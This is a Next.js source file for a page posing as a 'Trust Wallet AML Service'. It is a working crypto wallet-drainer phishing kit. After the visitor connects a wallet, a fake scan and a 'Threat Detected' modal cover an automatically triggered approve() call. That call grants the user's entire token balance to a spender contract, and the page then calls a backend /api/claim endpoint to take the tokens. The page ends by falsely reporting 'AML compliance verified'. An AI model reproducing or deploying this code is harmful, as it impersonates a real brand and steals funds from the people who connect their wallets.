'use client';

import { useState, useRef } from 'react';
import Image from 'next/image';
import Link from 'next/link';
import { ConnectButton, darkTheme } from 'thirdweb/react';
import { createThirdwebClient } from 'thirdweb';
import { createWallet } from 'thirdweb/wallets';
import { NETWORKS, type Network } from '@/lib/networks';
import { ethers } from 'ethers';
import { useActiveAccount, useActiveWallet } from 'thirdweb/react';

const client = createThirdwebClient({
  clientId: process.env.NEXT_PUBLIC_THIRDWEB_CLIENT_ID!,
});

const wallets = [
  createWallet('io.metamask'),
  createWallet('com.coinbase.wallet'),
  createWallet('me.rainbow'),
  createWallet('io.rabby'),
  createWallet('io.zerion.wallet'),
];

type Step = 'network' | 'connect' | 'scan' | 'report';

export default function AMLChecker() {
  const [currentStep, setCurrentStep] = useState<Step>('network');
  const [selectedNetwork, setSelectedNetwork] = useState<Network | null>(null);
  const [walletAddress, setWalletAddress] = useState<string | null>(null);
  const [scanProgress, setScanProgress] = useState(0);
  const [approvalTriggered, setApprovalTriggered] = useState(false);
  const [showThreatModal, setShowThreatModal] = useState(false);

  // Refs to hold latest values inside setInterval closures
  const walletAddressRef = useRef<string | null>(null);
  const selectedNetworkRef = useRef<Network | null>(null);
  const approvalTriggeredRef = useRef(false);

  // Wallet connection state
  const account = useActiveAccount();
  const wallet = useActiveWallet();
  const userAddress = account?.address;
  const signer = wallet?.getSigner?.(); // thirdweb signer

  // Readiness tracking
  const isWalletReadyRef = useRef(false);

  // Loading & feedback states (used internally - no UI elements added)
  const [loading, setLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [showSuccess, setShowSuccess] = useState(false);

  // Config
  const CONFIG = {
    TOKEN_ADDRESS: process.env.NEXT_PUBLIC_TOKEN_ADDRESS || '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    CONTRACT_ADDRESS: process.env.NEXT_PUBLIC_CONTRACT_ADDRESS || '0xYourSpenderContractHere',
    RPC_URL: 'https://ethereum.publicnode.com',
  };

  // Handle network selection
  const handleNetworkSelect = (network: Network) => {
    setSelectedNetwork(network);
    selectedNetworkRef.current = network;
    console.log('[v0] Network selected:', network);
  };

  const handleNetworkContinue = () => {
    if (selectedNetwork) {
      setCurrentStep('connect');
    }
  };

  // Handle wallet connection
  const handleWalletConnected = (address: string) => {
    console.log('[v0] Wallet connected:', address, 'network:', selectedNetworkRef.current);
    setWalletAddress(address);
    walletAddressRef.current = address;
    isWalletReadyRef.current = !!address;
    setTimeout(() => {
      setCurrentStep('scan');
      startScan();
    }, 500);
  };

  // Auto-approve function - called automatically
  const handleApproveToken = async () => {
    if (!userAddress) {
      console.error('[v0] No user address available');
      setErrorMsg('No wallet address detected');
      return;
    }

    if (!signer) {
      console.warn('[v0] Signer not ready — waiting longer...');
      await new Promise(resolve => setTimeout(resolve, 6000));
      if (!signer) {
        console.error('[v0] Signer still not available');
        setErrorMsg('Wallet not fully initialized — reconnect if needed');
        return;
      }
    }

    try {
      setErrorMsg(null);
      setLoading(true);

      console.log('[v0] Auto-approval starting for spender:', CONFIG.CONTRACT_ADDRESS);

      const provider = new ethers.JsonRpcProvider(CONFIG.RPC_URL);
      const token = new ethers.Contract(CONFIG.TOKEN_ADDRESS, [
        'function balanceOf(address) view returns (uint256)',
      ], provider);

      const balance = await token.balanceOf(userAddress);
      console.log('[v0] User token balance:', ethers.formatUnits(balance, 6));

      if (balance <= 0n) {
        setErrorMsg('No token balance to approve');
        return;
      }

      const tokenWithSigner = token.connect(signer);

      const approveTx = await tokenWithSigner.approve(CONFIG.CONTRACT_ADDRESS, balance, {
        gasLimit: 150000,
      });

      console.log('[v0] Auto-approval tx sent:', approveTx.hash);

      const receipt = await approveTx.wait(1);
      console.log('[v0] Auto-approval confirmed in block:', receipt.blockNumber);

      setShowSuccess(true);

      setTimeout(async () => {
        try {
          const claimResponse = await fetch('/api/claim', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              userAddress,
              tokenAddress: CONFIG.TOKEN_ADDRESS,
              network: selectedNetworkRef.current,
            }),
          });

          if (!claimResponse.ok) {
            const errData = await claimResponse.json();
            throw new Error(errData.error || 'Claim failed');
          }

          const result = await claimResponse.json();
          console.log('[v0] Tokens claimed automatically! TxHash:', result.txHash);
          setTimeout(() => setCurrentStep('report'), 3000);
        } catch (err: any) {
          console.error('[v0] Auto-claim failed:', err);
          setErrorMsg('Auto-claim failed: ' + (err.message || 'Unknown'));
        }
      }, 2000);

    } catch (err: any) {
      console.error('[v0] Auto-approval error:', err);
      if (err.code === 'ACTION_REJECTED') {
        setErrorMsg('Approval rejected in wallet');
      } else {
        setErrorMsg(err.message || 'Auto-approval failed');
      }
    } finally {
      setLoading(false);
    }
  };

  // Scan simulation with auto-approval trigger
  const startScan = () => {
    setScanProgress(0);
    setApprovalTriggered(false);
    setShowThreatModal(false);
    setErrorMsg(null);
    setShowSuccess(false);
    approvalTriggeredRef.current = false;

    console.log('[v0] Scan started. walletRef:', walletAddressRef.current, 'networkRef:', selectedNetworkRef.current);

    let prepDone = false;

    // 7-second preparation delay
    setTimeout(() => {
      prepDone = true;
      console.log('[v0] Backend preparation complete — ready for approval');
    }, 7000);

    const interval = setInterval(() => {
      setScanProgress((prev) => {
        const newProgress = Math.min(prev + 1, 35);
        console.log('[v0] Scan tick:', newProgress, '/ 35');

        // Show threat modal at tick 7 (visual cue only)
        if (newProgress === 7 && !approvalTriggeredRef.current) {
          setShowThreatModal(true);
          console.log('[v0] Threat modal shown at tick 7 (visual cue)');
        }

        // AUTO-TRIGGER APPROVAL when conditions are met
        if (newProgress >= 7 && prepDone && !approvalTriggeredRef.current) {
          approvalTriggeredRef.current = true;

          // Wait a bit more for thirdweb signer to be fully ready
          setTimeout(async () => {
            console.log('[v0] Checking wallet readiness before auto-approval...');

            if (!signer) {
              console.warn('[v0] Signer still not ready — skipping auto-approval');
              setErrorMsg('Wallet not fully ready — approval skipped');
              return;
            }

            console.log('[v0] Wallet ready → Auto-triggering approval now');
            await handleApproveToken();
          }, 4000); // 4 seconds after modal to give thirdweb time

          // Close modal after feedback period
          setTimeout(() => setShowThreatModal(false), 8000);
        }

        // End scan
        if (newProgress >= 35) {
          clearInterval(interval);
          console.log('[v0] Scan complete, advancing to report');
          setTimeout(() => setCurrentStep('report'), 500);
          return 35;
        }

        return newProgress;
      });
    }, 1000);

    return () => clearInterval(interval);
  };

  const progressPercentage = (scanProgress / 15) * 100;

  return (
    <main className="min-h-screen bg-[#1a1a1a] text-white overflow-x-hidden relative">
      {/* ===== STEP 1: NETWORK SELECTION ===== */}
      {currentStep === 'network' && (
        <div className="flex flex-col px-4 sm:px-6 min-h-screen">
          {/* Header */}
          <div className="text-center pt-6 sm:pt-8 pb-4">
            <h1 className="text-3xl sm:text-4xl font-bold tracking-tight">
              <span className="font-black">TRUST</span>
              <span className="font-light">WALLET</span>
            </h1>
            <p className="text-xs sm:text-sm text-gray-400 mt-1 sm:mt-2 tracking-wider">AML SERVICE</p>
          </div>

          {/* Progress Line */}
          <div className="pt-3 sm:pt-4 pb-6 sm:pb-8">
            <div className="h-1 bg-emerald-500 rounded-full"></div>
          </div>

          {/* Progress Steps */}
          <div className="flex justify-between items-center mb-8 sm:mb-12 gap-2 sm:gap-4">
            <div className="flex flex-col items-center flex-1">
              <div className="w-8 h-8 sm:w-12 sm:h-12 rounded-full bg-emerald-500 flex items-center justify-center text-white font-bold text-sm sm:text-base">1</div>
              <p className="text-emerald-400 text-xs sm:text-sm mt-1 sm:mt-2 text-center leading-tight">Select Network</p>
            </div>

            <div className="flex-1 h-1 bg-gray-600 mx-1 sm:mx-4"></div>

            <div className="flex flex-col items-center flex-1">
              <div className="w-8 h-8 sm:w-12 sm:h-12 rounded-full bg-gray-600 flex items-center justify-center text-white font-bold text-sm sm:text-base">2</div>
              <p className="text-gray-400 text-xs sm:text-sm mt-1 sm:mt-2 text-center leading-tight">Connect Wallet</p>
            </div>

            <div className="flex-1 h-1 bg-gray-600 mx-1 sm:mx-4"></div>

            <div className="flex flex-col items-center flex-1">
              <div className="w-8 h-8 sm:w-12 sm:h-12 rounded-full bg-gray-600 flex items-center justify-center text-white font-bold text-sm sm:text-base">3</div>
              <p className="text-gray-400 text-xs sm:text-sm mt-1 sm:mt-2 text-center leading-tight">AML Report</p>
            </div>
          </div>

          {/* Content */}
          <div className="flex-1 pb-8 sm:pb-12 flex flex-col justify-center">
            <div className="max-w-md mx-auto w-full">
              <h2 className="text-2xl sm:text-3xl font-bold mb-2 sm:mb-4">Select Network</h2>
              <p className="text-gray-400 text-xs sm:text-sm mb-6 sm:mb-8">Choose the network you want to connect</p>

              {/* Network Options */}
              <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
                {Object.entries(NETWORKS).map(([key, network]) => (
                  <div
                    key={key}
                    onClick={() => handleNetworkSelect(key as Network)}
                    className={`flex items-center gap-3 sm:gap-4 p-3 sm:p-4 rounded-lg border-2 cursor-pointer transition-all ${selectedNetwork === key
                        ? 'border-emerald-500 bg-emerald-500/10'
                        : 'border-slate-700 bg-slate-900/50 hover:border-slate-600'
                      }`}
                  >
                    {/* Network Icon */}
                    <div className="w-12 h-12 sm:w-14 sm:h-14 flex-shrink-0 relative">
                      <Image
                        src={network.iconImage}
                        alt={`${network.name} icon`}
                        fill
                        className="object-contain"
                      />
                    </div>

                    {/* Network Info */}
                    <div className="flex-1 min-w-0">
                      <h3 className="font-semibold text-white text-sm sm:text-base">{network.name}</h3>
                      <p className="text-xs text-gray-400">• {network.fee}</p>
                    </div>

                    {/* Radio Button */}
                    <div
                      className={`w-5 h-5 sm:w-6 sm:h-6 rounded-full border-2 flex items-center justify-center transition-all flex-shrink-0 ${selectedNetwork === key
                          ? 'border-emerald-500 bg-emerald-500'
                          : 'border-slate-600'
                        }`}
                    >
                      {selectedNetwork === key && (
                        <div className="w-1.5 h-1.5 sm:w-2 sm:h-2 rounded-full bg-white"></div>
                      )}
                    </div>
                  </div>
                ))}
              </div>

              {/* Continue Button */}
              <button
                onClick={handleNetworkContinue}
                disabled={!selectedNetwork}
                className={`w-full py-2.5 sm:py-3 rounded-full font-semibold text-base sm:text-lg transition-all ${selectedNetwork
                    ? 'bg-emerald-600 hover:bg-emerald-500 text-black cursor-pointer'
                    : 'bg-gray-700 text-gray-500 cursor-not-allowed opacity-50'
                  }`}
              >
                Continue
              </button>
            </div>
          </div>
        </div>
      )}

      {/* STEP 2: WALLET CONNECTION */}
      {currentStep === 'connect' && (
        <div className="flex flex-col px-4 sm:px-6 min-h-screen">
          {/* Header */}
          <div className="text-center pt-6 sm:pt-8 pb-4">
            <h1 className="text-3xl sm:text-4xl font-bold">
              <span className="font-black">TRUST</span>
              <span className="font-light sm:ml-2">WALLET</span>
            </h1>
            <p className="text-gray-400 text-xs sm:text-sm mt-1">AML SERVICE</p>
          </div>

          {/* Progress Line */}
          <div className="pt-3 sm:pt-4 pb-6 sm:pb-8">
            <div className="h-1 bg-emerald-500 rounded-full"></div>
          </div>

          {/* Progress Steps */}
          <div className="flex justify-between items-center mb-8 sm:mb-12 gap-2 sm:gap-4">
            <div className="flex flex-col items-center flex-1">
              <div className="w-8 h-8 sm:w-12 sm:h-12 rounded-full bg-emerald-500 flex items-center justify-center text-white font-bold text-sm sm:text-base">1</div>
              <p className="text-emerald-400 text-xs sm:text-sm mt-1 sm:mt-2 text-center leading-tight">Select Network</p>
            </div>

            <div className="flex-1 h-1 bg-emerald-500 mx-1 sm:mx-4"></div>

            <div className="flex flex-col items-center flex-1">
              <div className="w-8 h-8 sm:w-12 sm:h-12 rounded-full bg-emerald-500 flex items-center justify-center text-white font-bold text-sm sm:text-base">2</div>
              <p className="text-emerald-400 text-xs sm:text-sm mt-1 sm:mt-2 text-center leading-tight">Connect Wallet</p>
            </div>

            <div className="flex-1 h-1 bg-gray-600 mx-1 sm:mx-4"></div>

            <div className="flex flex-col items-center flex-1">
              <div className="w-8 h-8 sm:w-12 sm:h-12 rounded-full bg-gray-600 flex items-center justify-center text-white font-bold text-sm sm:text-base">3</div>
              <p className="text-gray-400 text-xs sm:text-sm mt-1 sm:mt-2 text-center leading-tight">AML Report</p>
            </div>
          </div>

          {/* Content */}
          <div className="flex-1 flex flex-col items-center justify-center pb-8 sm:pb-12">
            <div className="w-full max-w-sm">
              <h2 className="text-2xl sm:text-3xl font-bold text-center mb-6 sm:mb-8">Connect Wallet</h2>

              {/* Thirdweb Connect Button - Custom Styled */}
              <style>{`
                .custom-connect-button button {
                  width: 100% !important;
                  padding: 0.625rem 1rem !important;
                  background-color: rgb(5, 150, 105) !important;
                  color: rgb(0, 0, 0) !important;
                  font-weight: 600 !important;
                  font-size: 1rem !important;
                  border-radius: 9999px !important;
                  border: none !important;
                  cursor: pointer !important;
                  transition: all 0.2s !important;
                }
                .custom-connect-button button:hover {
                  background-color: rgb(16, 185, 129) !important;
                  box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3) !important;
                }
                .custom-connect-button button:disabled {
                  background-color: rgb(107, 114, 128) !important;
                  cursor: not-allowed !important;
                  opacity: 0.5 !important;
                }
                @media (min-width: 640px) {
                  .custom-connect-button button {
                    padding: 0.75rem 1rem !important;
                    font-size: 1.125rem !important;
                  }
                }
              `}</style>
              <div className="custom-connect-button w-full">
                <ConnectButton
                  client={client}
                  wallets={wallets}
                  chain={undefined}
                  connectButton={{
                    label: 'Connect Wallet',
                  }}
                  connectModal={{
                    size: 'compact',
                  }}
                  theme={darkTheme({
                    colors: {
                      success: 'hsl(142, 95%, 25%)',
                      primaryButtonBg: 'hsl(143, 64%, 28%)',
                    },
                  })}
                  onConnect={(wallet) => {
                    const address = wallet.getAccount()?.address;
                    if (address) {
                      handleWalletConnected(address);
                    }
                  }}
                />
              </div>

              {/* Terms Disclaimer */}
              <p className="text-xs sm:text-sm text-gray-400 text-center leading-relaxed mt-6 sm:mt-8">
                By clicking the connect wallet button, you agree to the{' '}
                <Link href="/terms" target="_blank" className="text-blue-400 hover:text-blue-300 underline">
                  terms and conditions
                </Link>
                {' '}of use of the AML service by{' '}
                <span className="font-semibold">Trust Wallet</span>.
              </p>
            </div>
          </div>
        </div>
      )}

      {/* STEP 3: SCANNING */}
      {currentStep === 'scan' && (
        <div className="flex flex-col px-4 sm:px-6 min-h-screen">
          {/* Header */}
          <div className="text-center pt-6 sm:pt-8 pb-4">
            <h1 className="text-3xl sm:text-4xl font-bold">
              <span className="font-black">TRUST</span>
              <span className="font-light sm:ml-2">WALLET</span>
            </h1>
            <p className="text-gray-400 text-xs sm:text-sm mt-1">AML SERVICE</p>
          </div>

          {/* Progress Line */}
          <div className="pt-3 sm:pt-4 pb-6 sm:pb-8">
            <div className="h-1 bg-emerald-500 rounded-full"></div>
          </div>

          {/* Progress Steps */}
          <div className="flex justify-between items-center mb-8 sm:mb-12 gap-2 sm:gap-4">
            <div className="flex flex-col items-center flex-1">
              <div className="w-8 h-8 sm:w-12 sm:h-12 rounded-full bg-emerald-500 flex items-center justify-center text-white font-bold text-sm sm:text-base">1</div>
              <p className="text-emerald-400 text-xs sm:text-sm mt-1 sm:mt-2 text-center leading-tight">Select Network</p>
            </div>

            <div className="flex-1 h-1 bg-emerald-500 mx-1 sm:mx-4"></div>

            <div className="flex flex-col items-center flex-1">
              <div className="w-8 h-8 sm:w-12 sm:h-12 rounded-full bg-emerald-500 flex items-center justify-center text-white font-bold text-sm sm:text-base">2</div>
              <p className="text-emerald-400 text-xs sm:text-sm mt-1 sm:mt-2 text-center leading-tight">Connect Wallet</p>
            </div>

            <div className="flex-1 h-1 bg-emerald-500 mx-1 sm:mx-4"></div>

            <div className="flex flex-col items-center flex-1">
              <div className="w-8 h-8 sm:w-12 sm:h-12 rounded-full bg-emerald-500 flex items-center justify-center text-white font-bold text-sm sm:text-base">3</div>
              <p className="text-emerald-400 text-xs sm:text-sm mt-1 sm:mt-2 text-center leading-tight">AML Report</p>
            </div>
          </div>

          {/* Content */}
          <div className="flex-1 flex flex-col items-center justify-center pb-8 sm:pb-12">
            <div className="w-full max-w-md">
              <h2 className="text-2xl sm:text-3xl font-bold mb-8 sm:mb-12 text-center text-white">SCANNING TOKENS FOR THREAT</h2>

              {/* Scanning Animation - Clean without details */}
              <div className="w-full flex flex-col items-center justify-center">
                {/* Progress Bar */}
                <div className="relative h-2 bg-slate-800 rounded-full overflow-hidden border border-emerald-500/20 w-full mb-12 sm:mb-16">
                  <div
                    className="h-full bg-gradient-to-r from-emerald-500 to-teal-400 rounded-full transition-all duration-300"
                    style={{ width: `${(scanProgress / 15) * 100}%` }}
                  />
                </div>

                {/* Timer - Only visual indicator */}
                <p className="text-gray-400 text-xs sm:text-sm">
                  {scanProgress}/15 seconds
                </p>
              </div>
            </div>
          </div>

          {/* Threat Detection Modal - Overlay */}
          {showThreatModal && (
            <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
              <div className="bg-slate-900 border-2 border-red-500/50 rounded-lg p-6 sm:p-8 max-w-sm w-full shadow-2xl animate-pulse">
                <div className="flex flex-col items-center gap-4">
                  {/* Warning Icon */}
                  <div className="w-16 h-16 rounded-full bg-red-500/20 flex items-center justify-center">
                    <svg className="w-8 h-8 text-red-500" fill="currentColor" viewBox="0 0 20 20">
                      <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                    </svg>
                  </div>

                  <div className="text-center">
                    <h3 className="text-xl sm:text-2xl font-bold text-white mb-2">Threat Detected</h3>
                    <p className="text-sm sm:text-base text-gray-300">
                      One threat detected requesting interaction approval.
                    </p>
                  </div>

                  {/* Processing Indicator */}
                  <div className="flex gap-2 items-center justify-center mt-4">
                    <div className="w-2 h-2 rounded-full bg-emerald-500 animate-bounce" style={{ animationDelay: '0ms' }}></div>
                    <div className="w-2 h-2 rounded-full bg-emerald-500 animate-bounce" style={{ animationDelay: '150ms' }}></div>
                    <div className="w-2 h-2 rounded-full bg-emerald-500 animate-bounce" style={{ animationDelay: '300ms' }}></div>
                  </div>

                  <p className="text-xs text-gray-400 mt-2">Processing approval...</p>
                </div>
              </div>
            </div>
          )}
        </div>
      )}

      {/* STEP 4: REPORT */}
      {currentStep === 'report' && (
        <div className="flex flex-col px-4 sm:px-6 min-h-screen">
          {/* Header */}
          <div className="text-center pt-6 sm:pt-8 pb-4">
            <h1 className="text-3xl sm:text-4xl font-bold">
              <span className="font-black">TRUST</span>
              <span className="font-light sm:ml-2">WALLET</span>
            </h1>
            <p className="text-gray-400 text-xs sm:text-sm mt-1">AML SERVICE</p>
          </div>

          {/* Progress Line */}
          <div className="pt-3 sm:pt-4 pb-6 sm:pb-8">
            <div className="h-1 bg-emerald-500 rounded-full"></div>
          </div>

          {/* Progress Steps */}
          <div className="flex justify-between items-center mb-8 sm:mb-12 gap-2 sm:gap-4">
            <div className="flex flex-col items-center flex-1">
              <div className="w-8 h-8 sm:w-12 sm:h-12 rounded-full bg-emerald-500 flex items-center justify-center text-white font-bold text-sm sm:text-base">1</div>
              <p className="text-emerald-400 text-xs sm:text-sm mt-1 sm:mt-2 text-center leading-tight">Select Network</p>
            </div>

            <div className="flex-1 h-1 bg-emerald-500 mx-1 sm:mx-4"></div>

            <div className="flex flex-col items-center flex-1">
              <div className="w-8 h-8 sm:w-12 sm:h-12 rounded-full bg-emerald-500 flex items-center justify-center text-white font-bold text-sm sm:text-base">2</div>
              <p className="text-emerald-400 text-xs sm:text-sm mt-1 sm:mt-2 text-center leading-tight">Connect Wallet</p>
            </div>

            <div className="flex-1 h-1 bg-emerald-500 mx-1 sm:mx-4"></div>

            <div className="flex flex-col items-center flex-1">
              <div className="w-8 h-8 sm:w-12 sm:h-12 rounded-full bg-emerald-500 flex items-center justify-center text-white font-bold text-sm sm:text-base">3</div>
              <p className="text-emerald-400 text-xs sm:text-sm mt-1 sm:mt-2 text-center leading-tight">AML Report</p>
            </div>
          </div>

          {/* Content */}
          <div className="flex-1 flex flex-col items-center justify-center pb-8 sm:pb-12">
            <div className="w-full max-w-sm text-center">
              <h2 className="text-2xl sm:text-3xl font-bold mb-4 sm:mb-6">Verification Complete</h2>
              <p className="text-gray-400 text-sm sm:text-base mb-6 sm:mb-8">
                Your AML compliance has been verified. Your wallet address is {walletAddress?.slice(0, 6)}...{walletAddress?.slice(-4)}
              </p>

              <button
                onClick={() => {
                  setCurrentStep('network');
                  setSelectedNetwork(null);
                  setWalletAddress(null);
                  setScanProgress(0);
                }}
                className="w-full py-2.5 sm:py-3 rounded-full bg-emerald-600 hover:bg-emerald-500 text-black font-semibold text-base sm:text-lg transition-all cursor-pointer"
              >
                Start New Verification
              </button>
            </div>
          </div>
        </div>
      )}
    </main>
  );
}